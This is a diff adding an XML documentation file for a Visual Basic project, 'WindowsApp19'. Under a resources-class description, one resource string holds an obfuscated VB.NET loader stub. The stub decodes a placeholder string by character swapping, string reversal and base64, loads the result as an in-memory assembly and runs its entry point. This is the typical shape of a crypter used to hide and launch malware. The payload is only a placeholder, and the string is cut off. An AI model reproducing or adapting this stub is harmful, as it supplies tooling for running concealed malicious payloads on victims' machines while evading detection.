@@ -1,0 +1,40 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+WindowsApp19
+</name>
+</assembly>
+<members>
+<member name="T:WindowsApp19.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:WindowsApp19.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:WindowsApp19.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:WindowsApp19.My.Resources.Resources.dddssss">
+<summary>
+  Looks up a localized string similar to Module uisygjskld
+    Dim Str As Object() = {&quot;&quot;, &quot;&quot;, &quot;&quot;, Decode(&quot;%str%&quot;)}
+    Dim Strrev As Object() = {&quot;&quot;, &quot;&quot;, StrReverse(Str(3))}
+    Dim Converter As Object() = {&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, Convert.FromBase64String(Strrev(2))}
+    Sub Main()
+        Dim Assembly() As Object = {&quot;&quot;, &quot;&quot;, &quot;&quot;, Reflection.Assembly.Load(Converter(6)).EntryPoint}
+        Dim Play() As Object = {&quot;&quot;, &quot;&quot;, Assembly(3).invoke(22 - 11, Nothing)}
+    End Sub
+    Function Decode(ByVal str)
+        Dim x = str.Replace(&quot;@&quot;, &quot;A&quot;).Repl [rest of string was truncated]&quot;;.
+</summary>
+</member>
+</members>
+</doc>
